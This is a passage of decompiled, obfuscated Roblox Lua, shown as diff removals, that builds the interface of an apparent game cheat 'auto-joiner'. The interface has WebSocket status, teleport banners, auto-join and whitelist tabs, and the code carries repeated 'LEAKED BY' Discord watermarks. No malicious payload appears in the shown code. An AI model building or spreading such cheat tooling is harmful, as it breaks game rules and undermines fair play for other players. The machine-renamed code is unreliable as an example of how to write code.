up_135.Default or up_127.Accent,BackgroundTransparency=0.45,BorderSizePixel=0,ZIndex=2,Parent=l});_=up_132("Frame",{Position=UDim2.fromOffset(20,7),Size=UDim2.fromOffset(26,26),BackgroundColor3=L(up_127.Element,up_127.Background,0.45),BorderSizePixel=0,ClipsDescendants=true,ZIndex=2,Parent=l});up_133(_,7);local o,T=up_132("ImageLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Image="",ScaleType=Enum.ScaleType.Crop,ZIndex=3,Parent=_}),up_132("TextLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=(E.name or"?"):sub(1,1):upper(),TextColor3=up_127.Accent,TextSize=15,ZIndex=2,Parent=_});_=up_136 (E.name);if _ then o.Image=_;T.Visible=false;else up_137 (E.name,function(_)if o:IsDescendantOf(up_138)then o.Image=_;T.Visible=false;end;end);end;up_132("TextLabel",{Position=UDim2.fromOffset(54,4),Size=UDim2.new(1,-66,0,16),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=E.name or"?",TextColor3=up_127.Text,TextSize=14,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=l});up_132("TextLabel",{Position=UDim2.fromOffset(54,20),Size=UDim2.new(1,-66,0,14),BackgroundTransparency=1,RichText=true,Font=Enum.Font.GothamMedium,Text=("%s   \194\183   <font color=\"%s\">%s</font>"):format(E.gen or"",J,R),TextColor3=up_127.TextDim,TextSize=12,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=l});return l;end;local function _(o,E,R,J,l,T,d,M)if not up_130 then return;end;K+=1;local C=d~=nil and#d>1;local V=100000-K;local F=up_128.jobElapsedResolver;if F and J then local U,q=pcall(F,J);V=if U and type(q)=="number"then(math.floor((q-os.clock())*100))else V;end;local U=up_132("Frame",{Size=UDim2.new(1,0,0,48),BackgroundColor3=up_127.Element,BorderSizePixel=0,ClipsDescendants=C,LayoutOrder=V,ZIndex=2,Parent=B});up_133(U,8);V=E and up_135[E]or up_135.Default or up_127.Accent;F=up_132("Frame",{Position=UDim2.fromOffset(0,8),Size=UDim2.new(0,3,0,32),BackgroundColor3=V,BorderSizePixel=0,ZIndex=2,Parent=U});up_133(F,2);local B=up_132("Frame",{Position=UDim2.fromOffset(10,7),Size=UDim2.fromOffset(34,34),BackgroundColor3=up_127.Element,BorderSizePixel=0,ClipsDescendants=true,ZIndex=2,Parent=U});up_133(B,8);local q,m=up_132("ImageLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Image="",ScaleType=Enum.ScaleType.Crop,ZIndex=3,Parent=B}),up_132("TextLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=(o or"?"):sub(1,1):upper(),TextColor3=up_127.Accent,TextSize=21,ZIndex=2,Parent=B});local Q=up_136 (o);if Q then q.Image=Q;m.Visible=false;else up_137 (o,function(c)if q:IsDescendantOf(up_138)then q.Image=c;m.Visible=false;end;end);end;local q=l and tostring(l)~=""and(tostring(l))or"Normal";local m,c,g=up_134(q),R or"",M and"   |   <font color=\"#C7A26B\">carpet</font>"or"";up_132("TextLabel",{Position=UDim2.fromOffset(52,6),Size=UDim2.new(1,-80,0,20),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=o,TextColor3=up_127.Text,TextSize=16,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=U});l,Q=up_132("TextLabel",{Position=UDim2.fromOffset(52,26),Size=UDim2.new(1,-80,0,16),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,RichText=true,Text=A("0s",q,m,c,g),TextColor3=up_127.TextDim,TextSize=14,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=U}),y(U);Q.MouseButton1Click:Connect(function()if I then task.spawn(I,o,E,R,J,T);end;end);if C then local I=#d-1;local A,y=4+(I*e+(I-1)*H)+6,up_125.ExpandBarHeight;local e,E=48+y,48+A+y;U.Size=UDim2.new(1,0,0,e);M=L(up_127.Element,up_127.Background,0.35);up_132("Frame",{Position=UDim2.new(0,12,0,48),Size=UDim2.new(1,-24,0,1),BackgroundColor3=up_127.Stroke,BackgroundTransparency=0.4,BorderSizePixel=0,ZIndex=4,Parent=U});local L=up_132("Frame",{Position=UDim2.fromOffset(0,48),Size=UDim2.new(1,0,0,A),BackgroundTransparency=1,ZIndex=2,Parent=U});up_132("UIListLayout",{Padding=UDim.new(0,H),SortOrder=Enum.SortOrder.LayoutOrder,Parent=L});up_132("UIPadding",{PaddingTop=UDim.new(0,4),PaddingBottom=UDim.new(0,6),PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8),Parent=L});for H=2,#d,1 do h(L,H,d[H]);end;A=up_132("TextButton",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,0,1,0),Size=UDim2.new(1,0,0,y),BackgroundColor3=M,AutoButtonColor=false,Text="",BorderSizePixel=0,ZIndex=3,Parent=U});up_133(A,8);up_132("Frame",{Size=UDim2.new(1,0,0,y/2),BackgroundColor3=M,BorderSizePixel=0,ZIndex=3,Parent=A});local H,L=up_132("TextLabel",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text="+"..I.." more on this server    v",TextColor3=up_127.Accent2,TextSize=12,ZIndex=4,Parent=A}),false;local function h(R)if R==L then return;end;L=R;up_129(U,0.24,{Size=UDim2.new(1,0,0,R and E or e)},Enum.EasingStyle.Quad,R and Enum.EasingDirection.Out or Enum.EasingDirection.In);H.Text=R and"show less    ^"or"+"..I.." more on this server    v";end;A.MouseButton1Click:Connect(function()h(not L);end);local I=up_132("Frame",{Size=UDim2.new(1,0,0,48),BackgroundColor3=Color3.fromRGB(255,255,255),BackgroundTransparency=1,BorderSizePixel=0,ZIndex=1,Parent=U});up_133(I,8);y=up_132("TextButton",{Size=UDim2.new(1,0,0,48),BackgroundTransparency=1,AutoButtonColor=false,Text="",ZIndex=2,Parent=U});y.MouseButton1Click:Connect(function()h(not L);end);y.MouseEnter:Connect(function()up_129(I,0.12,{BackgroundTransparency=0.93});end);y.MouseLeave:Connect(function()up_129(I,0.12,{BackgroundTransparency=1});end);end;d={row=U,line2=l,accentBar=F,iconHolder=B,joinBtn=Q,name=o,jobId=J,barBase=V,mutation=q,mutHex=m,earn=c,carpetTag=g,t0=os.clock()};table.insert(a,d);P(d);if J~=nil and J==v then j(d,N,S);end;while#a>up_125.FeedMaxRows do C=1;for B=2,#a,1 do C=if a[B].row.LayoutOrder>a[C].row.LayoutOrder then B else C;end;table.remove(a,C).row:Destroy();end;return U;end;return function(B,I,e,H,L,A)if not up_130 then return;end;local P=nil;local j=up_128.jobAnimalsResolver;if j and H then local y,h=pcall(j,H);P=if y and type(h)=="table"then h else P;end;if up_139 and P and#P>1 then j=nil;for y,y in ipairs(P)do j=j or _(y.name,y.rarity,y.gen,H,y.mutation,y.idx,nil,y.carpet);end;return j;end;return _(B,I,e,H,L,nil,not up_139 and P and#P>1 and P or nil,A);end,function(B)if not B then return;end;for I=#a,1,-1 do if a[I].jobId==B then a[I].row:Destroy();table.remove(a,I);end;end;end,function(B)B=tonumber(B)or 0;local I,e,H=up_128.markClearedResolver,up_128.joinStatusResolver,0;for w=#a,1,-1 do local L=a[w];if not L.joining then local A=L.lastStatus=="joined";if not A and e and L.jobId then local P,j=pcall(e,L.jobId);A=P and j=="joined";end;if A or s(L)>B then if I and L.jobId then pcall(I,L.jobId);end;L.row:Destroy();table.remove(a,w);H+=1;end;end;end;return H;end,p,W,r,function()for w=#a,1,-1 do if a[w].row then a[w].row:Destroy();end;a[w]=nil;end;v,N,S,K=nil,nil,nil,0;end;end
-
-					do
-						local Frame3 = slicedfn37("Frame", {
-							Name = "Notifications",
-							AnchorPoint = Vector2.new(1, 1),
-							Position = UDim2.new(1, -20, 1, -20),
-							Size = UDim2.fromOffset(300, 420),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							BackgroundTransparency = 1,
-							Parent = ScreenGui,
-						})
-
-						slicedfn37("UIListLayout", {
-							Padding = UDim.new(0, 8),
-							SortOrder = Enum.SortOrder.LayoutOrder,
-							VerticalAlignment = Enum.VerticalAlignment.Bottom,
-							HorizontalAlignment = Enum.HorizontalAlignment.Right,
-							Parent = Frame3,
-						})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						up_140 = slicedfn37
-						up_141 = tbl22
-						up_142 = Frame3
-					end
-				end
-
-				up_143 = slicedfn39
-				up_144 = slicedfn38
-				slicedfn43 = function(B,I,e)e=e or 4;local H=up_140("Frame",{Size=UDim2.new(1,0,0,66),BackgroundColor3=up_141.Sidebar,BackgroundTransparency=1,BorderSizePixel=0,Parent=up_142});up_143(H,10);local a,K=up_140("UIStroke",{Color=up_141.Stroke,Transparency=1,Thickness=1,Parent=H}),up_140("Frame",{Position=UDim2.fromOffset(0,10),Size=UDim2.new(0,3,1,-20),BackgroundColor3=up_141.Accent,BackgroundTransparency=1,BorderSizePixel=0,Parent=H});up_143(K,2);local L,A=up_140("TextLabel",{Position=UDim2.fromOffset(14,8),Size=UDim2.new(1,-22,0,20),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text=B,TextColor3=up_141.Text,TextTransparency=1,TextSize=17,TextXAlignment=Enum.TextXAlignment.Left,Parent=H}),up_140("TextLabel",{Position=UDim2.fromOffset(14,28),Size=UDim2.new(1,-22,0,32),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text=I,TextColor3=up_141.TextDim,TextTransparency=1,TextSize=15,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,Parent=H});up_144(H,0.3,{BackgroundTransparency=0.08});up_144(a,0.3,{Transparency=0.5});up_144(K,0.3,{BackgroundTransparency=0});up_144(L,0.3,{TextTransparency=0});up_144(A,0.3,{TextTransparency=0.2});task.delay(e,function()if not H.Parent then return;end;up_144(H,0.3,{BackgroundTransparency=1});up_144(a,0.3,{Transparency=1});up_144(K,0.3,{BackgroundTransparency=1});up_144(L,0.3,{TextTransparency=1});up_144(A,0.3,{TextTransparency=1});task.wait(0.35);H:Destroy();end);end
-				sliced91 = nil
-				sliced92 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_145 = slicedfn37
-				up_146 = tbl22
-				up_147 = ScreenGui
-				up_148 = slicedfn39
-				up_149 = slicedfn31
-				up_150 = sliced91
-				up_151 = flag18
-				up_152 = slicedfn38
-
-				up_153 = sliced92
-				;(function()local B=up_145("Frame",{Name="WsError",AnchorPoint=Vector2.new(0.5,0.5),Position=UDim2.fromScale(0.5,0.5),Size=UDim2.fromOffset(540,200),BackgroundColor3=up_146.Background,BackgroundTransparency=0.05,BorderSizePixel=0,Visible=false,ZIndex=90,Parent=up_147});up_148(B,14);up_145("UIStroke",{Color=up_146.Bad,Transparency=0.25,Thickness=1.5,Parent=B});local I=up_145("UIScale",{Scale=1,Parent=B});up_145("TextLabel",{Position=UDim2.fromOffset(22,16),Size=UDim2.new(1,-60,0,30),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="WebSocket connection failed",TextColor3=up_146.Bad,TextSize=24,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=91,Parent=B});local e=up_145("TextLabel",{Position=UDim2.fromOffset(22,52),Size=UDim2.new(1,-44,1,-96),BackgroundTransparency=1,Font=Enum.Font.Gotham,Text="",TextColor3=up_146.Text,TextSize=18,TextWrapped=true,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,ZIndex=91,Parent=B});up_145("TextLabel",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,22,1,-14),Size=UDim2.new(1,-44,0,18),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text="Retrying automatically \226\128\148 you can also switch region via the status tab (top).",TextColor3=up_146.TextDim,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=91,Parent=B});local H=up_145("TextButton",{AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,-12,0,12),Size=UDim2.fromOffset(26,26),BackgroundColor3=up_146.Element,AutoButtonColor=false,Font=Enum.Font.GothamBold,Text="\195\151",TextColor3=up_146.Text,TextSize=17,ZIndex=92,Parent=B});up_148(H,8);up_149 (H.MouseButton1Click:Connect(function()B.Visible=false;end));up_150 =function(H)if not up_151 then return;end;e.Text=tostring(H or"Unknown error");if not B.Visible then B.Visible=true;I.Scale=0.9;up_152(I,0.25,{Scale=1},Enum.EasingStyle.Back);end;end;up_153 =function()if B.Visible then B.Visible=false;end;end;end)()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_154 = nil
-				up_155 = slicedfn37
-				up_156 = tbl22
-				up_157 = ScreenGui
-				up_158 = slicedfn39
-				up_159 = slicedfn42
-				up_160 = nil
-				up_161 = nil
-				up_162 = nil
-
-				up_163 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				;(function()up_154 =up_155("Frame",{Name="JoinBanner",AnchorPoint=Vector2.new(0.5,0),Position=UDim2.new(0.5,0,0,-90),Size=UDim2.fromOffset(344,66),BackgroundColor3=up_156.Background,BackgroundTransparency=0.05,BorderSizePixel=0,Visible=false,ZIndex=60,Parent=up_157});up_158(up_154 ,14);up_155("UIStroke",{ApplyStrokeMode=Enum.ApplyStrokeMode.Border,Color=up_156.Accent,Thickness=1,Transparency=0.25,Parent=up_154 });up_155("UIGradient",{Color=ColorSequence.new(Color3.fromRGB(24,16,24),Color3.fromRGB(13,11,14)),Rotation=100,Parent=up_154 });local B=up_155("CanvasGroup",{Size=UDim2.fromScale(1,1),BackgroundTransparency=1,BorderSizePixel=0,ZIndex=60,Parent=up_154 });up_158(B,14);up_159(B,4,61,function()return up_154 .Visible;end);up_155("Frame",{Position=UDim2.fromOffset(0,12),Size=UDim2.new(0,4,1,-24),BackgroundColor3=up_156.Accent,BorderSizePixel=0,ZIndex=62,Parent=up_154 });up_160 =up_155("TextLabel",{Position=UDim2.fromOffset(18,9),Size=UDim2.new(1,-76,0,14),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="TELEPORTING TO",TextColor3=up_156.Accent2,TextTransparency=0.1,TextSize=13,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=62,Parent=up_154 });up_161 =up_155("TextLabel",{Position=UDim2.fromOffset(18,22),Size=UDim2.new(1,-76,0,20),BackgroundTransparency=1,Font=Enum.Font.GothamBold,Text="Brainrot",TextColor3=up_156.Text,TextSize=20,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=62,Parent=up_154 });up_162 =up_155("TextLabel",{AnchorPoint=Vector2.new(0,1),Position=UDim2.new(0,18,1,-9),Size=UDim2.new(1,-76,0,14),BackgroundTransparency=1,Font=Enum.Font.GothamMedium,Text="",TextColor3=up_156.Accent,TextSize=14,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=62,Parent=up_154 });up_163 =up_155("ImageLabel",{AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-12,0.5,0),Size=UDim2.fromOffset(46,46),BackgroundColor3=up_156.SliderTrack,BackgroundTransparency=0.35,Image="",ScaleType=Enum.ScaleType.Crop,Visible=false,ZIndex=62,Parent=up_154 });up_158(up_163 ,10);end)()
-				up_164 = nil
-				up_165 = slicedfn56
-				up_166 = slicedfn57
-				up_167 = nil
-				up_168 = nil
-
-				do
-					local function slicedfn63(B)up_164 .Visible=false;up_164 .Image="";local I=up_165 (B);if I then up_164 .Image=I;up_164 .Visible=true;return;end;up_166 (B,function(I)if up_167 and up_167 .Visible and up_168 .Text==tostring(B)then up_164 .Image=I;up_164 .Visible=true;end;end);end
-					up_169 = flag18
-					up_170 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					up_171 = nil
-					up_172 = nil
-					up_173 = nil
-					up_174 = slicedfn63
-					up_175 = slicedfn38
-					up_176 = 0
-					tbl19.showJoin = function(B,I,e)if not up_169 or not up_170 then return;end;up_171 .Text=e or"TELEPORTING TO";up_172 .Text=tostring(B or"Brainrot");up_173 .Text="Generation: "..tostring(I or"?");up_174(B);up_170 .Visible=true;up_175(up_170 ,0.3,{Position=UDim2.new(0.5,0,0,14)},Enum.EasingStyle.Back);up_176 +=1;local B=up_176 ;task.delay(3.5,function()if not up_169 or B~=up_176 or not up_170 then return;end;up_175(up_170 ,0.3,{Position=UDim2.new(0.5,0,0,-90)},Enum.EasingStyle.Quad,Enum.EasingDirection.In);task.wait(0.32);if B==up_176 and up_170 then up_170 .Visible=false;end;end);end
-					up_177 = flag18
-					up_178 = nil
-					up_179 = 0  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					up_180 = nil
-					up_181 = nil
-					up_182 = nil
-					up_183 = nil
-					up_184 = slicedfn63
-				end
-			end
-
-			do
-				up_185 = slicedfn38
-				up_186 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				up_187 = 0
-				up_188 = slicedfn38
-				tbl19.showJoinProgress = function(B,I,e,H)if not up_177 or not up_178 then return;end;up_179 +=1;up_180 .Text="CONNECTING TO";up_181 .Text=tostring(B or"Brainrot");up_182 .Text="Generation: "..tostring(I or"?").."  \194\183  attempt "..tostring(e or 1).."/"..tostring(H or"?");if(e or 1)==1 or not up_183 .Visible then up_184(B);end;up_178 .Visible=true;up_185(up_178 ,0.3,{Position=UDim2.new(0.5,0,0,14)},Enum.EasingStyle.Back);end
-				tbl19.hideJoin = function()if not up_186 then return;end;up_187 +=1;local B=up_187 ;up_188(up_186 ,0.3,{Position=UDim2.new(0.5,0,0,-90)},Enum.EasingStyle.Quad,Enum.EasingDirection.In);task.delay(0.32,function()if B==up_187 and up_186 then up_186 .Visible=false;end;end);end
-				n = 190
-				slicedn33 = 66
-
-				sliced93 = slicedfn37("TextButton", {
-					Name = "MinimizedIcon",
-					AnchorPoint = Vector2.new(0, 0),
-					Position = UDim2.fromScale(0.5, 0.5),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					Size = UDim2.fromOffset(190, 66),
-					BackgroundColor3 = tbl22.Background,
-					AutoButtonColor = false,
-					Text = "",
-					Visible = false,
-					ClipsDescendants = true,
-					Parent = ScreenGui,
-				})
-
-				slicedfn39(sliced93, 16)
-
-				slicedfn37("UIStroke", {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
-					Color = tbl22.Stroke,
-					Transparency = 0.2,
-					Thickness = 1,
-					Parent = sliced93,
-				})
-
-				do
-					local color = Color3.fromRGB
-					local v = 14
-
-					slicedfn37("UIGradient", {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						Color = ColorSequence.new(Color3.fromRGB(24, 16, 24), color(13, 11, v)),
-						Rotation = 120,
-						Parent = sliced93,
-					})
-				end
-			end
-
-			sliced94 = slicedfn37("UIScale", { Scale = 0, Parent = sliced93 })
-
-			Frame2 = slicedfn37("Frame", {
-				Position = UDim2.fromOffset(9, 10),
-				Size = UDim2.fromOffset(46, 46),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				BackgroundColor3 = tbl22.Element,
-				BorderSizePixel = 0,
-				ClipsDescendants = true,
-				ZIndex = 2,
-				Parent = sliced93,
-			})
-
-			slicedfn39(Frame2, 12)
-
-			do
-				local color = Color3.fromRGB
-				local v = 18  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				slicedfn37("UIGradient", {
-					Color = ColorSequence.new(Color3.fromRGB(34, 22, 34), color(v, 13, 18)),
-					Rotation = 125,
-					Parent = Frame2,
-				})
-			end
-		end
-
-		do
-			local v
-
-			do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				v = slicedfn37("UIStroke", {
-					ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
-					Color = tbl22.Accent,
-					Thickness = 1.4,
-					Transparency = 0.2,
-					Parent = Frame2,
-				})
-
-				do
-					local CanvasGroup = slicedfn37("CanvasGroup", {
-						Size = UDim2.fromScale(1, 1),  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						BackgroundTransparency = 1,
-						BorderSizePixel = 0,
-						ZIndex = 2,
-						Parent = Frame2,
-					})
-
-					slicedfn39(CanvasGroup, 12)
-
-					slicedfn42(CanvasGroup, 3, 3, function()
-						return sliced93.Visible
-					end)
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			slicedfn37("TextLabel", {
-				Size = UDim2.fromScale(1, 1),
-				BackgroundTransparency = 1,
-				Font = Enum.Font.GothamBold,
-				Text = "K",
-				TextColor3 = tbl22.Accent,
-				TextSize = 28,
-				ZIndex = 3,
-				Parent = Frame2,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			})
-
-			tbl25.iconDot = slicedfn37("Frame", {
-				AnchorPoint = Vector2.new(0, 0.5),
-				Position = UDim2.fromOffset(65, 17),
-				Size = UDim2.fromOffset(9, 9),
-				BackgroundColor3 = tbl22.Bad,
-				BorderSizePixel = 0,
-				ZIndex = 3,
-				Parent = sliced93,
-			})  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			slicedfn39(tbl25.iconDot, 5)
-
-			tbl25.miniWsText = slicedfn37("TextLabel", {
-				Position = UDim2.fromOffset(81, 8),
-				Size = UDim2.fromOffset(n - 90, 16),
-				BackgroundTransparency = 1,
-				Font = Enum.Font.GothamBold,
-				Text = "Offline",
-				TextColor3 = tbl22.Bad,
-				TextSize = 16,
-				TextTruncate = Enum.TextTruncate.AtEnd,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				TextXAlignment = Enum.TextXAlignment.Left,
-				ZIndex = 3,
-				Parent = sliced93,
-			})
-
-			do
-				local autoJoin, sliced96 = slicedfn34()
-
-				tbl25.miniAjText = slicedfn37("TextLabel", {
-					Position = UDim2.fromOffset(65, 27),
-					Size = UDim2.fromOffset(n - 74, 15),
-					BackgroundTransparency = 1,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					Font = Enum.Font.GothamMedium,
-					Text = "Auto Join: " .. autoJoin,
-					TextColor3 = sliced96,
-					TextSize = 15,
-					TextXAlignment = Enum.TextXAlignment.Left,
-					ZIndex = 3,
-					Parent = sliced93,
-				})
-			end
-
-			tbl25.miniThird = slicedfn37("TextLabel", {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				Position = UDim2.fromOffset(65, 44),
-				Size = UDim2.fromOffset(n - 74, 14),
-				BackgroundTransparency = 1,
-				Font = Enum.Font.Gotham,
-				Text = tbl25.wsRegionText or "—",
-				TextColor3 = tbl22.TextDim,
-				TextTransparency = 0.15,
-				TextSize = 14,
-				TextTruncate = Enum.TextTruncate.AtEnd,
-				TextXAlignment = Enum.TextXAlignment.Left,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				ZIndex = 3,
-				Parent = sliced93,
-			})
-
-			task.spawn(function()
-				while flag18 and sliced93.Parent do
-					if sliced93.Visible then
-						slicedfn38(v, 1.2, { Transparency = 0.5 })
-						task.wait(1.2)
-						slicedfn38(v, 1.2, { Transparency = 0.12 })
-						task.wait(1.2)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					else
-						task.wait(0.4)
-					end
-				end
-			end)
-		end
-	end
-
-	do
-		sliced95 = nil
-
-		do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			local function slicedfn63(arg)
-				local absoluteSize = ScreenGui.AbsoluteSize
-				if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
-					return arg
-				end
-				local slicedn34 = arg.Y.Scale * absoluteSize.Y + arg.Y.Offset
-				local slicedn35 = x2 / 2
-				local slicedn36 = y2 / 2
-				local slicedn37 = math.clamp(arg.X.Scale * absoluteSize.X + arg.X.Offset, slicedn35, math.max(slicedn35, absoluteSize.X - slicedn35))
-				local slicedn38 = math.clamp(slicedn34, slicedn36, math.max(slicedn36, absoluteSize.Y - slicedn36))  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local floor2 = math.floor
-				return UDim2.fromOffset(math.floor(slicedn37), floor2(slicedn38))
-			end
-
-			up_189 = flag20
-			up_190 = flag19
-			up_191 = sliced88
-			up_192 = sliced95
-			up_193 = nil
-			up_194 = Frame
-			up_195 = ScreenGui  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			up_196 = n
-			up_197 = sliced84
-			up_198 = slicedn33
-			up_199 = slicedfn38
-			up_200 = sliced85
-			up_201 = sliced93
-			up_202 = sliced94
-			up_203 = slicedfn30
-			up_204 = slicedfn63
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-
-	up_205 = x2
-	up_206 = y2
-	up_207 = nil
-	up_208 = sliced87
-	slicedfn62 = function(B)if up_189 or up_190 ==B then return;end;up_189 ,up_190 =true,B;if B then local B=up_191 ();if up_192 then local I=up_192 ();if I and I.PlaybackState==Enum.PlaybackState.Playing then I.Completed:Wait();end;end;if B and B.PlaybackState==Enum.PlaybackState.Playing then B.Completed:Wait();end;up_193 =up_194.Position;local I,e=up_195.AbsolutePosition,up_194.AbsolutePosition;local H,a=e.X-I.X,e.Y-I.Y;up_194.AnchorPoint=Vector2.new(0,0);up_194.Position=UDim2.fromOffset(H,a);I,B=math.max(1,math.floor(up_196/up_197 +0.5)),math.max(1,math.floor(up_198/up_197 +0.5));up_199(up_200,0.1,{Scale=up_197 });up_194.ClipsDescendants=true;up_199(up_194,0.32,{Size=UDim2.fromOffset(I,B)},Enum.EasingStyle.Cubic,Enum.EasingDirection.In).Completed:Wait();B=up_195.AbsoluteSize;up_201.Position=UDim2.fromOffset(math.clamp(math.floor(H),0,math.max(0,B.X-up_196)),math.clamp(math.floor(a),0,math.max(0,B.Y-up_198)));up_202.Scale=1;up_201.Visible=true;up_194.Visible=false;up_194.ClipsDescendants=false;a,H=up_203();up_194.Size=UDim2.fromOffset(a,H);up_194.AnchorPoint=Vector2.new(0.5,0.5);up_194.Position=up_193 ;else local B=up_201.Position;local I=up_204 (UDim2.fromOffset(math.floor(B.X.Offset+up_205 /2),math.floor(B.Y.Offset+up_206 /2)));up_193 =I;local B,e,H,a,K,L=I.X.Offset,I.Y.Offset,math.max(1,math.floor(up_196/up_197 +0.5)),math.max(1,math.floor(up_198/up_197 +0.5)),up_203();up_194.AnchorPoint=Vector2.new(0,0);up_194.Position=UDim2.fromOffset(math.floor(B-up_205 /2),math.floor(e-up_206 /2));up_194.Size=UDim2.fromOffset(H,a);up_200.Scale=up_197 ;up_194.ClipsDescendants=true;up_194.Visible=true;up_201.Visible=false;up_199(up_194,0.32,{Size=UDim2.fromOffset(K,L)},Enum.EasingStyle.Cubic,Enum.EasingDirection.Out).Completed:Wait();up_194.ClipsDescendants=false;up_194.AnchorPoint=Vector2.new(0.5,0.5);up_194.Position=I;if up_207 then up_207 ();end;up_208 ();end;up_189 =false;end
-
-	slicedfn31(sliced90.MouseButton1Click:Connect(function()
-		task.spawn(slicedfn62, true)
-	end))
-
-	slicedfn31(sliced93.InputBegan:Connect(function(input)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			local position = input.Position
-			local position2 = sliced93.Position
-			local slicedn34 = 0
-
-			slicedfn44(function(arg)
-				local slicedn35 = arg.Position - position
-				slicedn34 = math.max(slicedn34, slicedn35.Magnitude)
-				sliced93.Position = UDim2.new(position2.X.Scale, position2.X.Offset + slicedn35.X, position2.Y.Scale, position2.Y.Offset + slicedn35.Y)
-			end, function()
-				if slicedn34 < 6 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					task.spawn(slicedfn62, false)
-				end
-			end, input.UserInputType)
-		end
-	end))
-
-	do
-		local function slicedfn63()
-			if flag20 then
-				local slicedn34 = os.clock() + 2
-
-				while true do  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					task.wait(0.05)
-					if not (not flag20 or not flag18 or os.clock() >= slicedn34) then
-						continue
-					end
-					break
-				end
-			end
-
-			if not flag18 or flag20 then
-				return
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			flag20 = true
-			local v = sliced88()
-
-			if sliced95 then
-				local sliced96 = sliced95()
-
-				if sliced96 and sliced96.PlaybackState == Enum.PlaybackState.Playing then
-					sliced96.Completed:Wait()
-				end
-			end
-
-			if v and v.PlaybackState == Enum.PlaybackState.Playing then
-				v.Completed:Wait()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			slicedfn38(sliced85, 0.3, { Scale = 0 }, Enum.EasingStyle.Quart, Enum.EasingDirection.In).Completed:Wait()
-			slicedfn40()
-			ScreenGui:Destroy()
-		end
-
-		slicedfn31(sliced89.MouseButton1Click:Connect(function()
-			task.spawn(slicedfn63)
-		end))
-	end
-end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-local sliced96, sliced97, sliced98, sliced99
-
-do
-	local Main = slicedfn46("Main", { scroll = false })
-	local Whitelist = slicedfn46("Whitelist", { scroll = false })
-	local sliced100 = slicedfn46("Config")
-	local sliced101 = slicedfn46("AJ Users")
-	sliced96 = slicedfn46("Info")
-	sliced97 = function() end
-	sliced98 = nil
-	sliced99 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	up_209 = slicedfn48
-	up_210 = Main
-	up_211 = slicedfn34
-	up_212 = slicedfn59
-	up_213 = nil
-	up_214 = tbl23
